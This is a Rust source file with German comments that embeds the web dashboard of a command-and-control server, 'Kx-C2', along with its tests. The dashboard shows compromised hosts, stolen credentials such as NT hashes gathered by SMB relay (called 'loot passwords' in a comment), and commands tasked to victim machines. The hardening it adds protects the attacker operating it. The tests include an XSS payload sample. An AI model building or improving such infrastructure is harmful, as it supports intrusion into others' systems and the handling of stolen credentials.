//! Kx-Server Dashboard: einfache HTML-Übersicht über Hosts, Secrets, Tasks.
//!
//! Liefert eine minimale Single-Page-Übersicht, die die JSON-API abfragt.

/// Statische HTML-Datei für das Dashboard.
pub const DASHBOARD_HTML: &str = r#"<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="utf-8">
  <title>Kx-C2 Dashboard</title>
  <style>
    body { font-family: monospace; background:#111; color:#ddd; margin:2rem; }
    h1 { color:#7f8; } table { border-collapse: collapse; width:100%; }
    th, td { border:1px solid #444; padding:6px; text-align:left; }
    th { background:#222; } .host { color:#8cf; } .secret { color:#fc6; }
    #login { border:1px solid #444; padding:1rem; margin-bottom:1.5rem; }
    #login input { background:#222; color:#ddd; border:1px solid #444; padding:4px; }
    #login button { background:#333; color:#ddd; border:1px solid #444; padding:4px 12px; cursor:pointer; }
    #msg { color:#f88; }
  </style>
</head>
<body>
  <h1>Kx-C2 Dashboard</h1>
  <form id="login">
    <label for="token">C2-Token:</label>
    <input id="token" type="password" autocomplete="off">
    <button type="submit">Anmelden</button>
    <span id="msg"></span>
  </form>
  <h2>Hosts</h2>
  <table id="hosts"><thead><tr><th>IP</th><th>Hostname</th><th>OS</th><th>Status</th></tr></thead><tbody></tbody></table>
  <h2>Secrets</h2>
  <table id="secrets"><thead><tr><th>Host</th><th>Typ</th><th>Benutzer</th><th>Passwort</th><th>Quelle</th></tr></thead><tbody></tbody></table>
  <h2>Tasks</h2>
  <table id="tasks"><thead><tr><th>Host</th><th>Befehl</th><th>Status</th><th>Ergebnis</th></tr></thead><tbody></tbody></table>
  <script>
    // Das Token steht in einer Variablen, nicht in der URL: im Query-String
    // landet es in Browser-Historie, Adressleiste und Server-Logs. Nach einem
    // Neuladen der Seite ist es verloren, der Operator meldet sich erneut an.
    let TOKEN = '';
    // API-Werte sind Fremddaten: ein Hostname kann HTML enthalten. Ohne
    // Escaping wird er beim Einsetzen in die Tabelle zu ausfuehrbarem Markup
    // (stored XSS) — im Browser des Operators, in dem die Beute-Passwoerter
    // stehen. Deshalb laeuft JEDER Wert durch diese Funktion.
    function esc(s) {
      return String(s).replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
      })[c]);
    }
    async function load(path, id, map) {
      const r = await fetch(path, { headers: { 'Authorization': 'Bearer ' + TOKEN } });
      if (!r.ok) { document.getElementById(id).innerHTML = '<tr><td>Auth fehlgeschlagen</td></tr>'; return; }
      const data = await r.json();
      document.querySelector('#'+id+' tbody').innerHTML =
        data.map(row => '<tr>' + map(row).join('') + '</tr>').join('');
    }
    function loadAll() {
      load('/api/hosts', 'hosts', h => [h.ip, h.hostname, h.os, h.status].map(x => `<td>${esc(x)}</td>`));
      load('/api/secrets', 'secrets', s => [s.host_id, s.cred_type, s.username, s.password || '<verschluesselt>', s.source].map(x => `<td>${esc(x)}</td>`));
      load('/api/tasks', 'tasks', t => [t.host_id, t.command, t.status, t.result].map(x => `<td>${esc(x)}</td>`));
    }
    document.getElementById('login').addEventListener('submit', async ev => {
      ev.preventDefault();
      const msg = document.getElementById('msg');
      msg.textContent = '';
      const token = document.getElementById('token').value;
      const r = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: token })
      });
      if (!r.ok) { msg.textContent = 'Token falsch'; return; }
      TOKEN = token;
      document.getElementById('token').value = '';
      document.getElementById('login').style.display = 'none';
      loadAll();
    });
  </script>
</body>
</html>"#;

#[cfg(test)]
mod tests {
    use super::*;
    use kx_core::c2;
    use std::collections::BTreeSet;

    /// Die Feldnamen, die das Dashboard-JavaScript liest, und der Typ, zu dem sie
    /// gehören. Das Dashboard ist die fünfte Fundstelle des Wire-Vertrags — sie
    /// steckt in einem JavaScript-String und driftete deshalb unbemerkt.
    fn dashboard_reads() -> Vec<(&'static str, char)> {
        let mut out = Vec::new();
        for line in DASHBOARD_HTML.lines() {
            let Some(start) = line.find("load('") else {
                continue;
            };
            let rest = &line[start + "load('".len()..];
            let end = rest.find('\'').expect("Endpunkt-Strich");
            let endpoint = &rest[..end];
            // Der Mapper beginnt mit `h => [h.feld, ...]` — die Variable vor der
            // Klammer benennt den Typ, aus dem die Felder gelesen werden.
            let arrow = line.find("=> [").expect("Mapper-Start");
            let prefix = line[arrow + "=> [".len()..]
                .chars()
                .next()
                .expect("Mapper-Variable");
            out.push((endpoint, prefix));
        }
        out
    }

    /// Liest alle `prefix.feld`-Zugriffe einer Zeile ein.
    fn fields_of(line: &str, prefix: char) -> BTreeSet<String> {
        let chars: Vec<char> = line.chars().collect();
        let mut out = BTreeSet::new();
        let mut i = 0;
        while i < chars.len() {
            if chars[i] == prefix && i + 1 < chars.len() && chars[i + 1] == '.' {
                let mut field = String::new();
                for c in &chars[i + 2..] {
                    if c.is_ascii_alphanumeric() || *c == '_' {
                        field.push(*c);
                    } else {
                        break;
                    }
                }
                if !field.is_empty() {
                    i += 2 + field.chars().count();
                    out.insert(field);
                } else {
                    i += 2;
                }
                continue;
            }
            i += 1;
        }
        out
    }

    fn keys<T: serde::Serialize>(value: &T) -> BTreeSet<String> {
        serde_json::to_value(value)
            .expect("serialisierbar")
            .as_object()
            .expect("Objekt")
            .keys()
            .cloned()
            .collect()
    }

    fn sample_host() -> c2::Host {
        c2::Host {
            host_id: "10.0.0.5".into(),
            ip: "10.0.0.5".into(),
            hostname: "target".into(),
            os: "Windows".into(),
            status: c2::STATUS_COMPROMISED.into(),
            first_seen: "2026-11-11T00:00:00Z".into(),
            last_seen: "2026-11-11T00:05:00Z".into(),
            sealed_master: String::new(),
        }
    }

    fn sample_secret() -> c2::ExfiltratedSecret {
        c2::ExfiltratedSecret {
            id: "s-1".into(),
            host_id: "10.0.0.5".into(),
            cred_type: "nt_hash".into(),
            username: "Administrator".into(),
            password: "hash".into(),
            source: "smb_relay".into(),
            collected_at: "2026-11-11T00:05:00Z".into(),
            sealed_password: String::new(),
        }
    }

    fn sample_task() -> c2::Task {
        c2::Task {
            id: "t-1".into(),
            host_id: "10.0.0.5".into(),
            command: "whoami".into(),
            status: "done".into(),
            result: "nt authority\\system".into(),
            created_at: "2026-11-11T00:06:00Z".into(),
        }
    }

    #[test]
    fn dashboard_endpoints_are_the_contract_paths() {
        let reads = dashboard_reads();
        assert_eq!(reads.len(), 3, "das Dashboard lädt genau drei Endpunkte");
        let endpoints: Vec<&str> = reads.iter().map(|(e, _)| *e).collect();
        assert_eq!(
            endpoints,
            vec![c2::PATH_HOSTS, c2::PATH_SECRETS, c2::PATH_TASKS]
        );
    }

    #[test]
    fn dashboard_reads_only_fields_the_contract_defines() {
        let mut checked = 0;
        for line in DASHBOARD_HTML.lines() {
            if !line.contains("load('") {
                continue;
            }
            let prefix = line[line.find("=> [").expect("Mapper-Start") + "=> [".len()..]
                .chars()
                .next()
                .expect("Mapper-Variable");
            let fields = fields_of(line, prefix);
            assert!(!fields.is_empty(), "Mapper liest keine Felder");
            let available = match prefix {
                'h' => keys(&sample_host()),
                's' => keys(&sample_secret()),
                't' => keys(&sample_task()),
                other => panic!("unbekannter Mapper '{other}'"),
            };
            for field in &fields {
                assert!(
                    available.contains(field),
                    "das Dashboard liest '{prefix}.{field}', das der Wire-Typ nicht kennt"
                );
            }
            checked += fields.len();
        }
        assert!(checked >= 13, "erwartete Feldzugriffe, gefunden: {checked}");
    }

    #[test]
    fn dashboard_reads_the_task_result_field() {
        // `t.result` ist der Name, den der Server sendet. Vorher sendete er
        // `result`, während der CLI `output` erwartete — das Dashboard war die
        // einzige Stelle, die es richtig las.
        let line = DASHBOARD_HTML
            .lines()
            .find(|l| l.contains("PATH_TASKS") || l.contains("/api/tasks"))
            .expect("Task-Zeile");
        assert!(fields_of(line, 't').contains("result"));
    }

    /// Das HTML-Escaping, gespiegelt in Rust.
    ///
    /// Der Browser wertet das JavaScript im Dashboard aus. Damit der Test
    /// aussagekräftig ist, spiegelt er die Ersetzungsregel nach — er prüft
    /// also nicht nur, dass ein `esc(` im HTML steht, sondern dass die
    /// Ersetzung genau die Zeichen behandelt, die HTML auslösen.
    fn escape_html(s: &str) -> String {
        let mut out = String::with_capacity(s.len());
        for c in s.chars() {
            match c {
                '&' => out.push_str("&amp;"),
                '<' => out.push_str("&lt;"),
                '>' => out.push_str("&gt;"),
                '"' => out.push_str("&quot;"),
                '\'' => out.push_str("&#39;"),
                other => out.push(other),
            }
        }
        out
    }

    /// Jeder API-Wert läuft durch den Escape-Helper.
    ///
    /// Ohne diesen Test bleibt das Dashboard bei einem injizierten
    /// `<script>` im `hostname` ausführbar — der Fehler, der den XSS auslöst.
    #[test]
    fn dashboard_escapes_every_api_value() {
        // Der Helper muss existieren und genau die fünf HTML-Zeichen behandeln.
        assert!(
            DASHBOARD_HTML.contains("function esc("),
            "das Dashboard hat keinen Escaping-Helper"
        );
        for (raw, escaped) in [
            (
                "<img src=x onerror=alert(1)>",
                "&lt;img src=x onerror=alert(1)&gt;",
            ),
            ("a & b", "a &amp; b"),
            ("\"quoted\"", "&quot;quoted&quot;"),
            ("it's", "it&#39;s"),
            ("a > b", "a &gt; b"),
        ] {
            assert_eq!(escape_html(raw), escaped, "Escaping von {raw:?} falsch");
        }

        // Und: jeder Mapper, der einen Wert einsetzt, muss ihn escapen.
        for line in DASHBOARD_HTML.lines().filter(|l| l.contains("load('")) {
            assert!(
                line.contains("esc(x)"),
                "eine load()-Zeile setzt einen Wert unescaped ein: {line}"
            );
            assert!(
                !line.contains("${x}"),
                "eine load()-Zeile interpoliert einen Wert unescaped: {line}"
            );
        }
    }

    /// Das Token kommt nicht aus der URL.
    ///
    /// Im Query-String landet es in der Browser-Historie, in der Adressleiste
    /// und in den Server-Logs.
    #[test]
    fn dashboard_does_not_read_the_token_from_the_url() {
        assert!(
            !DASHBOARD_HTML.contains("location.search"),
            "das Dashboard liest das Token weiterhin aus dem Query-String"
        );
    }
}
